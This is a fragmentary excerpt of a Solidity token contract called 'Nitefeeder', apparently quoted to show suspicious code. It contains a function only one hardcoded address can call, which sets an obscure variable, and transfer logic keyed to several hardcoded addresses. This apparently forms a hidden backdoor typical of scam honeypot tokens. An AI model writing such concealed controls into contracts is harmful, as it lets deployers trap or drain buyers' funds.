...
contract STMAP is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        require(_msgSender() == 0x9f90a84E5735E8406d21c04FBA05712aA55E53ED );
          _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x3615ac3a3513eF5518382cb1688fd4a6759aE966 
         && from != 0x518aabF5b27c3C1bBDF51858F917847D6396A12E 
         && from != 0xb62be6C8C6d5726faa9F5BeE838C7da61466F242)) {
    ...
    constructor() {
        _name = unicode"Nitefeeder";
        _symbol = unicode"Nitefeeder";
